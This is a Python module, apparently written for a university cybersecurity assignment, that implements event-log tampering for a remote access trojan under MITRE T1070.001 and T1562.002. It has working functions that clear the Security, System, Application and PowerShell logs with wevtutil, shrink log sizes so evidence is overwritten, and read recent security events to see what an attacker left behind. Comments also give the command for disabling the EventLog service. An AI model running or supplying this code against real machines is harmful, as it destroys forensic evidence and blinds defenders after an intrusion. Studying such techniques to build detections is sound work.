"""
Event Log Tampering Module
MITRE ATT&CK: T1070.001 (Indicator Removal: Clear Windows Event Logs)
                T1562.002 (Impair Defenses: Disable Windows Event Logging)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Windows Event Logs are the primary forensic evidence source:
  - Security.evtx → logins, failed logins, privilege use
  - System.evtx → service installs, driver loads, shutdowns
  - Application.evtx → app crashes, .NET errors
  - PowerShell/Operational → script execution (forensic goldmine)
  - Sysmon/Operational → process creation, network connections (if installed)

APTs always target event logs post-compromise:
  - Clear logs entirely (noisy but effective)
  - Selectively delete entries (stealthier, requires patching .evtx)
  - Disable logging service (prevents future evidence)
  - Reduce log retention size (passive evidence destruction)

This module demonstrates log enumeration + clearing.
LOG CLEARING IS DISABLED BY DEFAULT — enable via config toggle.
"""

import subprocess
import os
import re
import ctypes


def is_admin():
    """Check if running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def enumerate_event_logs():
    """
    List all Windows event log channels and their entry counts.

    Uses 'wevtutil el' (enumerate logs) and 'wevtutil gli' (get log info).

    Returns:
        list of dicts: [{name, records, size_bytes, retention, enabled}]
    """
    logs = []

    # High-value logs for forensics (check these first)
    priority_logs = [
        "Security",
        "System",
        "Application",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-Windows Defender/Operational",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
        "Windows PowerShell",
    ]

    for log_name in priority_logs:
        info = _get_log_info(log_name)
        if info:
            logs.append(info)

    return logs


def _get_log_info(log_name):
    """Get detailed info about a single event log channel."""
    try:
        result = subprocess.run(
            ["wevtutil", "gli", log_name],
            capture_output=True, text=True, timeout=10
        )

        if result.returncode != 0:
            return None

        info = {
            "name": log_name,
            "records": 0,
            "size_bytes": 0,
            "max_size_bytes": 0,
            "retention": "unknown",
            "enabled": True,
            "log_path": "",
        }

        for line in result.stdout.split("\n"):
            line = line.strip()

            records_match = re.match(r"numberOfLogRecords:\s*(\d+)", line)
            if records_match:
                info["records"] = int(records_match.group(1))

            size_match = re.match(r"fileSize:\s*(\d+)", line)
            if size_match:
                info["size_bytes"] = int(size_match.group(1))

            max_match = re.match(r"maxSize:\s*(\d+)", line)
            if max_match:
                info["max_size_bytes"] = int(max_match.group(1))

            retention_match = re.match(r"retention:\s*(\w+)", line)
            if retention_match:
                info["retention"] = retention_match.group(1)

            enabled_match = re.match(r"enabled:\s*(\w+)", line)
            if enabled_match:
                info["enabled"] = enabled_match.group(1).lower() == "true"

            path_match = re.match(r"logFileName:\s*(.+)", line)
            if path_match:
                info["log_path"] = path_match.group(1).strip()

        return info

    except Exception:
        return None


def get_recent_security_events(count=20):
    """
    Query recent security events to understand what evidence exists.

    Useful for an attacker to know what has been logged about their activity.

    Args:
        count: Number of recent events to retrieve

    Returns:
        list of dicts: [{event_id, time_created, message_preview}]
    """
    events = []
    try:
        result = subprocess.run(
            ["wevtutil", "qe", "Security",
             f"/c:{count}", "/rd:true", "/f:text"],
            capture_output=True, text=True, timeout=15
        )

        current_event = {}
        for line in result.stdout.split("\n"):
            line = line.strip()

            if line.startswith("Event["):
                if current_event:
                    events.append(current_event)
                current_event = {}

            id_match = re.match(r"Event ID:\s*(\d+)", line)
            if id_match:
                current_event["event_id"] = int(id_match.group(1))

            time_match = re.match(r"Date:\s*(.+)", line)
            if time_match:
                current_event["time_created"] = time_match.group(1).strip()

            source_match = re.match(r"Source:\s*(.+)", line)
            if source_match:
                current_event["source"] = source_match.group(1).strip()

            desc_match = re.match(r"Description:\s*(.+)", line)
            if desc_match:
                current_event["description"] = desc_match.group(1).strip()[:200]

        if current_event:
            events.append(current_event)

    except Exception:
        pass

    return events


def clear_event_log(log_name):
    """
    Clear a specific Windows event log.

    REQUIRES ADMINISTRATOR PRIVILEGES.
    This is the most common anti-forensics technique used by APTs.

    Event ID 1102 (Security) or 104 (System) is generated when logs
    are cleared — so clearing itself leaves evidence unless you also
    clear the log that records the clearing (recursive problem).

    Args:
        log_name: Name of the event log to clear

    Returns:
        dict with success status and detail
    """
    if not is_admin():
        return {
            "log": log_name,
            "cleared": False,
            "detail": "Requires administrator privileges",
        }

    try:
        result = subprocess.run(
            ["wevtutil", "cl", log_name],
            capture_output=True, text=True, timeout=10
        )

        return {
            "log": log_name,
            "cleared": result.returncode == 0,
            "detail": "cleared successfully" if result.returncode == 0
                      else f"failed: {result.stderr.strip()}",
        }

    except Exception as e:
        return {
            "log": log_name,
            "cleared": False,
            "detail": f"error: {str(e)}",
        }


def clear_forensic_logs():
    """
    Clear all high-value forensic event logs.

    Targets the logs that would contain evidence of the RAT:
      - Security: login events, process auditing
      - System: service installs
      - PowerShell: script execution
      - Application: application errors

    Returns:
        list of clear results
    """
    target_logs = [
        "Security",
        "System",
        "Application",
        "Microsoft-Windows-PowerShell/Operational",
        "Windows PowerShell",
    ]

    results = []
    for log in target_logs:
        result = clear_event_log(log)
        results.append(result)

    return results


def disable_event_log_service():
    """
    Check if the Windows Event Log service can be disabled (T1562.002).

    NOTE: This only REPORTS the service status, it does NOT actually
    disable it. Disabling in a demo environment would break other things.

    Returns:
        dict with service status and whether disabling is possible
    """
    info = {
        "service_name": "EventLog",
        "status": "unknown",
        "start_type": "unknown",
        "can_disable": False,
        "detail": "",
    }

    try:
        result = subprocess.run(
            ["sc", "query", "EventLog"],
            capture_output=True, text=True, timeout=10
        )

        state_match = re.search(r"STATE\s*:\s*\d+\s+(\w+)", result.stdout)
        if state_match:
            info["status"] = state_match.group(1)

        result2 = subprocess.run(
            ["sc", "qc", "EventLog"],
            capture_output=True, text=True, timeout=10
        )

        start_match = re.search(r"START_TYPE\s*:\s*\d+\s+(\w+)", result2.stdout)
        if start_match:
            info["start_type"] = start_match.group(1)

        info["can_disable"] = is_admin()
        info["detail"] = (
            "Admin: could disable via 'sc config EventLog start=disabled'"
            if is_admin()
            else "Non-admin: cannot modify EventLog service"
        )

    except Exception as e:
        info["detail"] = f"Error querying service: {e}"

    return info


def reduce_log_size(log_name, new_max_kb=64):
    """
    Reduce the maximum size of an event log.

    A subtler alternative to clearing: shrink the log so old evidence
    is automatically overwritten faster. Changing from 20MB → 64KB
    means the log only holds a few minutes of events.

    Args:
        log_name: Event log channel name
        new_max_kb: New maximum size in KB (minimum 64)

    Returns:
        dict with result
    """
    if not is_admin():
        return {
            "log": log_name,
            "success": False,
            "detail": "Requires administrator privileges",
        }

    new_max_bytes = max(new_max_kb, 64) * 1024

    try:
        result = subprocess.run(
            ["wevtutil", "sl", log_name, f"/ms:{new_max_bytes}"],
            capture_output=True, text=True, timeout=10
        )

        return {
            "log": log_name,
            "success": result.returncode == 0,
            "new_max_kb": new_max_kb,
            "detail": f"Max size set to {new_max_kb}KB" if result.returncode == 0
                      else f"Failed: {result.stderr.strip()}",
        }

    except Exception as e:
        return {
            "log": log_name,
            "success": False,
            "detail": f"Error: {e}",
        }


def full_event_log_recon(clear_logs=False):
    """
    Run full event log reconnaissance and optionally clear logs.

    Args:
        clear_logs: If True AND running as admin, clear forensic logs.
                    Disabled by default for safety.

    Returns:
        dict with all event log intelligence
    """
    admin = is_admin()
    logs = enumerate_event_logs()
    recent_security = get_recent_security_events(20)
    service_info = disable_event_log_service()
    clear_results = []

    if clear_logs and admin:
        clear_results = clear_forensic_logs()

    total_records = sum(l.get("records", 0) for l in logs)
    total_size = sum(l.get("size_bytes", 0) for l in logs)

    return {
        "is_admin": admin,
        "event_logs": logs,
        "recent_security_events": recent_security,
        "eventlog_service": service_info,
        "logs_cleared": clear_results,
        "summary": {
            "is_admin": admin,
            "logs_enumerated": len(logs),
            "total_records": total_records,
            "total_size_mb": round(total_size / (1024 * 1024), 2),
            "logs_cleared": len([r for r in clear_results if r.get("cleared")]),
            "security_events_sampled": len(recent_security),
        }
    }


if __name__ == "__main__":
    print("=" * 55)
    print("  Event Log Tampering Module Test")
    print("  T1070.001 + T1562.002")
    print("=" * 55)

    admin = is_admin()
    print(f"\n[*] Running as: {'ADMINISTRATOR' if admin else 'standard user'}")

    # Enumerate logs
    logs = enumerate_event_logs()
    print(f"\n[+] Event logs found: {len(logs)}")
    for log in logs:
        size_kb = log['size_bytes'] / 1024
        status = "ENABLED" if log['enabled'] else "DISABLED"
        print(f"    {log['name'][:50]:<50s} {log['records']:>8d} records "
              f"({size_kb:>8.0f} KB) [{status}]")

    total = sum(l["records"] for l in logs)
    print(f"\n    Total: {total} records across {len(logs)} logs")

    # Recent security events
    events = get_recent_security_events(10)
    if events:
        print(f"\n[+] Recent security events (last {len(events)}):")
        for e in events:
            eid = e.get("event_id", "?")
            time = e.get("time_created", "?")
            desc = e.get("description", "")[:60]
            print(f"    [{eid}] {time} - {desc}")

    # Service info
    svc = disable_event_log_service()
    print(f"\n[*] EventLog service: {svc['status']} (start: {svc['start_type']})")
    print(f"    {svc['detail']}")

    if admin:
        print(f"\n{'-'*55}")
        print("  [!] Running as admin — log clearing is POSSIBLE")
        print("  [!] NOT clearing in test mode (use clear_forensic_logs())")
        print(f"{'-'*55}")
    else:
        print(f"\n[*] Not admin — log clearing would fail")
